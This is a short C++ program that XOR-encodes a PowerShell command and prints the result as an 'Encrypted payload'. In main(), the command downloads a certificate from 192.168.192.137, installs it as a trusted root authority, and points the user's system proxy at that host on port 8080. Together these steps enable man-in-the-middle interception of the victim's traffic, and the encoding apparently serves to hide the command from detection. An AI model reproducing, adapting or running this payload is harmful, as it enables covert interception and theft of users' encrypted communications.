#include<windows.h>
#include<iostream>
#include <cstring>
#include <sstream>
#include <iomanip>

std::string charToHex(std::string& input) {
    std::stringstream ss;
    std::cout << "len of input: " << input.length() << std::endl;
    ss << std::hex << std::setfill('0');

    for (size_t i = 0; i < input.length(); ++i) {
        // std::cout << i << std::endl;
        ss << std::setw(2) << static_cast<int>(static_cast<unsigned char>(input[i]));
    }

    return ss.str();
}

std::string xorStrings(std::string str1, std::string str2) {
    size_t len1 = str1.length();
    size_t len2 = str2.length();

    std::string repeatedStr2;

    for (size_t i = 0; i < len1; ++i) {
        repeatedStr2 += str2[i % len2]; // Repeating str2 to match the length of str1
    }
    std::cout<< "Len of str1: " << len1 << std::endl;
    std::cout<< "Len of repeatedStr2: " << repeatedStr2.length() << std::endl;

    // Perform XOR operation
    std::string xorResult;
    for (size_t i = 0; i < len1; ++i) {
        xorResult += str1[i] ^ repeatedStr2[i];
    }
    std::cout<< "Len of xorResult: " << xorResult.length() << std::endl;

    return charToHex(xorResult);
}

int main(){
    std::string powershellCommand = "powershell.exe -Command \"$outputCertFilePath = 'C:\\Users\\'  + $Env:UserName + '\\AppData\\Local\\Temp\\cert.cer'\";echo $outputCertFilePath;$url = 'http://192.168.192.137/software/cert.cer';Invoke-WebRequest -Uri $url -OutFile $outputCertFilePath;Import-Certificate -FilePath $outputCertFilePath -CertStoreLocation 'Cert:\\LocalMachine\\Root' -Verbose;rm $outputCertFilePath;Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' -Name ProxyServer -Value '192.168.192.137:8080';Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' -Name ProxyEnable -Value 1";
    std::string key = "zauzooz";
    powershellCommand = xorStrings(powershellCommand, key);
    std::cout<<"Encrypted payload:"<< powershellCommand << std::endl;
    std::cout<<"Len of Encrypted payload:"<< powershellCommand.length() << std::endl;
    return 0;
}